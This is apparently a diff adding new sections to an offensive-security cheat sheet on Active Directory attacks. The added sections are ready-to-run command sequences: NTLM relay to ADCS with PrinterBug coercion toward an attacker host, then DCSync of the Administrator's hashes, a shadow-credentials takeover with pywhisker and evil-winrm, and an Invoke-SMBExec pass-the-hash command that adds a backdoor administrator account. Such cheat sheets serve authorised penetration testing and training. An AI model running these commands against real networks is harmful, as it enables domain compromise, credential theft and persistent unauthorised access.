@@ -187,6 +187,70 @@ python3 secretsdump.py -security security.save -system system.save -sam sam.save
 
 * https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
+### DCSync via Pass the Certificate (ADCS Relay)
+
+When ADCS (Active Directory Certificate Services) exposes a web enrollment endpoint, relay NTLM authentication to request a certificate for the DC machine account.
+
+**Step 1:** Start ntlmrelayx targeting the ADCS enrollment endpoint:
+
+```bash
+impacket-ntlmrelayx -t http://ADCS_IP/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+**Step 2:** Coerce the DC to authenticate to your relay using PrinterBug:
+
+```bash
+python3 printerbug.py DOMAIN/user:'password'@DC_IP ATTACKER_IP
+```
+
+**Step 3:** When the certificate is captured, convert it to a TGT:
+
+```bash
+python3 gettgtpkinit.py -cert-pfx /tmp/DC01.pfx -dc-ip DC_IP 'domain.local/dc01$' /tmp/dc.ccache
+```
+
+**Step 4:** Use the TGT to DCSync:
+
+```bash
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip DC_IP DOMAIN/dc01\$@dc01.domain.local
+```
+
+---
+
+### Shadow Credentials (msDS-KeyCredentialLink)
+
+If you have write access to a user's `msDS-KeyCredentialLink` attribute (identify via BloodHound), use pywhisker to add a key credential and authenticate as that user.
+
+**Step 1:** Add a shadow credential:
+
+```bash
+pywhisker --dc-ip DC_IP -d DOMAIN -u ATTACKER_USER -p 'PASSWORD' --target TARGET_USER --action add
+```
+
+**Step 2:** Use the generated PFX to get a TGT:
+
+```bash
+python3 gettgtpkinit.py -cert-pfx OUTPUT.pfx -pfx-pass 'PFX_PASSWORD' -dc-ip DC_IP DOMAIN/TARGET_USER /tmp/target.ccache
+```
+
+**Step 3:** Use the TGT:
+
+```bash
+export KRB5CCNAME=/tmp/target.ccache
+evil-winrm -i dc01.domain.local -r domain.local
+```
+
+---
+
+### Invoke-SMBExec — Remote Command Execution with Hash
+
+```powershell
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+
+---
+
 ### Invoke-ShareFinder
 
 ```
